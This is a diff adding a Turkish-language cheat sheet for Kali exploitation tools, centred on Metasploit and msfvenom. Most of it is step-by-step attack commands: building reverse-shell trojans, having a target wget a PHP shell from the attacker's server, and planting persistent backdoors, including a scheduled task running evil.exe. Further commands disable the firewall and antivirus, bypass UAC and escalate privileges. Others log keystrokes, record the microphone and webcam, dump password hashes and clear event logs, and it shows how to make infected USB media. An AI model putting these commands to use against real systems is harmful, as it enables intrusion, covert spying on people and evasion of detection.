@@ -1,0 +1,229 @@
+## 07. EXPLOİTATİON TOOLS (İSTİSMAR ARAÇLARI):
+
+### Armitage :
+	Sistemlere sızmaya yarayan bir program. Metasploit yazılımın görsel hali.
+### Beef XSS Framework :	
+	Tarayıcı ele geçirmek için kullanılır. URL sağ tıkla tarayıcıda aç. Kullanıcı adı ve şifre: beef
+### Metasploit :
+	auxiliary : Bilgi toplama üzerine uygulama.
+	exploit : Sisteme erişmeyi sağlayan kod parçacığı.
+	payload : Sisteme eriştikten sonra ne yapılacağını belirten kod parçacığı
+    encoder : Payloadların antivirüs programlarına yakalanmasını önlemek için şifreleme    yöntemlerini kullanarak gizlenmesini sağlar.
+    
+    search winrar  = İstediğimiz uygulama hakkında yazılmış bir exploit varmı diye bakar.
+    “msfconsole”
+    “use exploit_adı”
+    “show options” 	
+    “set RHOSTS 192.168.1.10”
+    “exploit”
+    
+    Başlangıç Ayarları : service postgresql start  -- msfdb init  -- msfdb run
+
+    workspace –a  =>  çalışma alanı oluştur.  –d ile alanı siler.
+    db_import /dosya_yolu  => içeri dosya yükleme
+    
+### Metasploit Community:
+    Metasploit yazılımının görsel ve daha düzenli hali. Tarayıcıdan adını aratarak indirin.(Kayıt gerektirir.) 
+    “chmod +x indirilen_dosya_adı” ile yüklemek için yetki veriyoruz. Yükledikten sonra explorer satırına “localhost:3790” yaz. Yeni kullanıcı oluştur. Rapid7 sitesinden lisansla.
+    
+### msfvenom
+    msfconsole’un payload oluştuma modülüdür.
+    `msfvenom -p payload_adı LHOST=kendi ipmiz LPORT=4444 -f exe -o /cıkıs_yolu/payload.exe`
+    
+    Dış ağa bağlanırken LHOST yerine dış ağ ip adresimizi yazıcaz. Yazdığımız port’u modemden açmamız gerekecek. Modem ayarlarından port no gir. ip adresi yerine local ip adresimizi gireceğiz.
+    **netsec.ws sitesi hazır payload örnekleri sunuyor.
+    
+    Trojan oluştuktan sonra dinlemeye almak için;
+    “msfconsole”
+    “use exploit/multi/handler”
+    “set payload payload_adı”
+    “set LHOST local ip miz”
+    “set LPORT 4444”
+    “run”
+    “sessions”	 -> Açık bağlantıları gösterir.
+    “sessions -i 1”	 -> Birinci bağlantıyı açar.
+    
+#### msf ile shell alma
+    1.	msfvenom ile payload oluştur. (php/meterpreter/reverse_tcp)
+    2.	kendi pc mizde http server aç.  (“python -m SimpleHTTPServer”) 
+    Not: python3 ile : python –m http.server 
+    3.	Hedef pc ‘de cmd satırında:   “wget http://kendi_ipmiz:8000/shell.php -O a.php”
+    // kendi pcmizde oluşan shell.php yi a.php olarak hedef pc ye aldık
+    4.	Tetiklemek için:
+    a.	Kendi pc mizi dinleme moda al
+    b.	Hedef pc de adres satırına yolu yaz. (../a.php) yada komut satırına “php a.php” yaz
+
+#### Kalıcı bağlantı sağlamak için
+    Pc her açıldığında otomatik olarak kalıcı bağlantı sağlamak için;
+    “handler > use exploit/windows/local/persistence”
+    “show options”
+    “set exe_name ......”
+    “set session 1”
+    “show advanced”
+    “set exe::custom /var/.......payload adı”
+    
+#### Meterpreter  Komutları (Sızma Sonrası Yapılanlar)
+    Dosya İndirme
+    download -r dosya adı /root/nereye kaydedileceği
+    
+    Dosya Yükleme
+    upload -r /root/gidecek dosya yolu   C:\..\gideceği yer
+    
+    Ekran Görüntüsü Alma
+    screenshot		=	Direk alır, kaydeder
+    screenshot -p  /.../	=	Kayıt yolu belirt
+    screenshot -q 200	=	Çözünürlük arttırma
+    screenshot -v true	=	Direk görüntü açar
+    “run vnc” komutu ile meterpreter satırında hedefin ekran görüntüsünü canlı video olarak getirme.
+    
+    Ses Kaydı Alma
+    record_mic
+    
+    Webcam Görüntüsü Alma
+    webcam_chat		=	Karşılıklı kamera görüşme
+    webcam_list		=	Varolan kamera listesi verir
+    webcam_snapt		=	Listelenen kamera arasından seçim yapma
+    webcam_stream	=	Hedef kamera açıp canlı izleme yapma
+    
+    Web Browser’dan Bilgi Çekme
+    Alınan verileri okumak için “sqllite database” uygulamasını kullanırız
+    run enum_chrome	=> Chrome ile ilgili bilgileri çeker
+    run enum_firefox	=> Firefox ile ilgili bilgileri çeker
+    
+    Güvenlik Duvarını Kapatma
+    run getcountermeasure -h
+    run getcountermeasure -d	=	Güvenlik duvarını devre dışı bırakır.
+    run getcountermeasure -k	=	Virüs programını devre dışı bırakır.
+    olmazsa;
+        Güvenlik duvarı için:
+    1.shell yaz komut satırına geç
+    2.netsh advfirewall set allprofiles state off/on (kapa yada aç)
+    Virüs programı için:
+    1.meterpreter ortamında “ps” ile çalışan process leri gör.
+    2.virüs pid yazar kapatırız  (kill 2592)
+    
+    Klavye Tuşlarını Kaydetme
+    1.	“run keylogrecorder”
+    Ctrl+c ile durdur. txt dosyasına kaydeder.
+    2.	“keyscan_start”	=>  başlat
+    “keyscan_stop”		=> durdur
+    “keyscan_dump”	=> sonuçları görüntüleme
+    
+    Hedefte Dosya Arama
+    “search -f *.txt -d aranacak yer”
+    
+    Şifreleri Elde Etme
+    “hashdump”	=> Şifreleri getirir hash değerli olarak
+    
+    Klavye Mouse Devre Dışı Bırakma
+    “uictl disable/enable keyboard”
+    “uictl disable/enable mouse”
+    
+    Uzak Masaüstü Bağlantısı
+    “rdesktop ip adresi”
+    
+    Yüklü Uygulamalar ve Versiyonlarını Görme
+    “run get_application_list”
+    
+    Dns Spoofing
+    Sitenin yönleneceği yeri seçme
+    Host dosyasını düzenleme;
+    Tek adres için	=>	run hostedit -e ip adres, site adı
+    Çoklu adres için	   =>	run hostedit -l  /..../....txt
+    Not : Kullanıcı denetimi isteyebilir.
+    
+    Paket Sniffing
+    use sniffer_start 2    // 2 ağ kartı numarası
+    use sniffer_stop 2
+    sniffer_dump 2 /root/...pcap  => dinlemeyi kaydet.
+    
+    Arkada Bırakılan İzleri Temizleme
+    “clearev”
+    “run event_manager -c”
+    
+    PC’nin Kullanılmadığı Süreyi Görme
+    “idletime”
+    
+    Kullanıcı Denetimini Kapatma
+    Exploit ile yapıyoruz. Backgrounda geç
+    1.	use exploit/windows/local/bypassuac
+    set session 1
+    exploit
+    2.	shell => reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\system /v EnableLUA /t REG_DWORD /d 1 /f      // 1 açar,  0 kapatır
+    
+    Exploiti Başka Uygulamaya Enjekte Etme
+    Pc yeniden başladığında otomatik çalışması için
+    Fark edilmemesi için
+    “migrate pid no”
+    
+    Yetki Yükseltme
+    “getuid”	=>	Yetki görme
+    1.	yol)	“getsystem”	=> Yetki yükseltme
+    2.	yol)	Oturumu backgrounda al
+    use exploit/windows/local/ppr_flatten_rec
+    show option
+    set session 1
+    exploit
+    3.	yol)	“use exploit/windows/local/bypassuac” exploitini dene
+    
+    Kullanıcı Adı Parola Girerek Sisteme Giriş
+    use exploit/windows/smb/psexec
+    set payload windows/meterpreter/reverse_tcp
+    set RHOST hedef ip
+    set SMBPass parola
+    set SMBUser kullanıcı adı
+    set LHOST kendi ipmiz
+    
+    Arka Kapı Oluşturma
+    Bağlantı koptuktan sonra tekrar bağlanabilmek için;
+    “run persistence”
+    “run persistence -A -L  C:/Windows/system32  -U kullanıcı adı  -i 25 -p 4444 -r kendi ip adresimiz”
+    -A	=	otomatik başlama
+    -L	=	belirtilen yola saklansın
+    -i	=	belirtilen saniyede bir bağlantıyı kontrol eder, tekrar bağlar
+    Bağlantı açmak için;
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST
+    set LPORT
+    exploit
+    
+    Zamanlanmış Görevleri Kullanarak Backdoor Yükleme
+    Admin yetkisiyle shell ekranında;
+    “schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn backdoor /tr “\” C:\\Users\Default\\evil.exe\””
+    
+### Token Elde Etme
+    Load incognito
+    list_tokens -u
+    impersonate_token “domain\\kullanıcı”   (geçmek istediğin tokenı yaz)
+    rev2self	Eski tokena dönme
+    get privs 	Kullanıcı yetkilerini görme
+    SeDebugPrivilege	Başka prosess belleğini okuma
+    Assing Primary İmpersonate varsa rottenpotato kullan.
+    Load incognito
+    execute -f potato.exe -Hc
+    list_tokens -u
+
+
+### Searchsploit :	
+    Güncel exploitleri bulmaya yarayan bir araç.
+	`searchsploit facebook`
+	
+### Social-Engineering Toolkit :
+	Sosyal mühendislik saldırılarında kullanılır. Sosyal mecraları yada herhangi bir siteyi klonlamada kullanılır.
+	Örnek saldırı : Usb takınca direk bağlantı kurma.
+	1 yaz enter
+	İnfectious Media Generator
+	2
+	2
+	Local ip adresi gir
+	Port gir
+	root/.set/ dosyası oluştu. Bu dosyayı usb veya cd yazdır. takıldığı pc otomatik dinlemeye geçer.
+
+### Hidden Eye
+Sosyal mecraları klonlamada kullanılır.
+
+
+### Termineter :
+	Akıllı sayaçların penetrasyon testlerinde kullanılır.
+	“termineter”  -> “show modules”  -> “use modul adı”  -> “show options”  -> “set ....”  ->“run” 
